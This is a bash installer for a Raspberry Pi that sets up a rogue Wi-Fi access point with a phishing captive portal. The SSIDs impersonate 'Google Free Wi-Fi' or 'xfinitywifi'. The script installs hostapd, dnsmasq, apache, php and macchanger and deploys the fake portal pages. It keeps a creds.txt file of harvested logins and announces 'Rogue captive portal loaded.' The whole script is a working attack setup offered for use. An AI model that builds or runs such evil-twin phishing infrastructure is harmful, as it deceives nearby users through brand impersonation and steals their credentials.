#!/bin/bash
# INSTALL WIFI ACCESS POINT CONFIG AND CAPTIVE PORTAL
# For Raspberry Pi Raspbian Stretch Lite OS
#
# usage:
#     sudo bash install.sh
#
# version 2019.04.12


if [ "$(id -u)" != "0" ]; then
   echo "This script must be run as root:  sudo bash {file.sh}." 1>&2
   exit 1
fi

PS3="Please enter which portal to install: "
options=("Google-portal" "Xfinity-portal")
select opt in "${options[@]}"
do
    case $opt in
        "Google-portal")
            SSID="ssid=Google Free Wi-Fi"
	    DIR=google
            break
            ;;
        "Xfinity-portal")
            SSID="ssid=xfinitywifi"
	    DIR=xfinity
            break
            ;;
        *) echo "invalid option $REPLY";;
    esac
done

echo Installing $SSID
echo "You can rerun this script to change the portal"

sed -i '/ssid=/c'"${SSID}" hostapd.conf


echo "Installing dependencies..."
apt-get install macchanger hostapd dnsmasq apache2 php

echo "Configuring components..."
# clears old html dir
cp -p /var/www/html/creds.txt $DIR/creds.txt
rm -rf /var/www/html
# install configs
cp -f shutdown-btn.py /usr/local/bin/
chmod +x /usr/local/bin/shutdown-btn.py
cp -f status.py /usr/local/bin/
chmod +x /usr/local/bin/status.py
cp -Rf fonts /usr/local/etc/fonts

cp -f hostapd.conf /etc/hostapd/
cp -f dnsmasq.conf /etc/
cp -Rf $DIR /var/www/html
chown -R www-data:www-data /var/www/html
chown root:www-data /var/www/html/.htaccess
cp -f rc.local /etc/
cp -f override.conf /etc/apache2/conf-available/
cd /etc/apache2/conf-enabled
ln -sf ../conf-available/override.conf override.conf
cd /etc/apache2/mods-enabled
ln -sf ../mods-available/rewrite.load rewrite.load

echo "Rogue captive portal loaded."
echo "REBOOT to execute."
echo "Then conect to $SSID"
exit 0
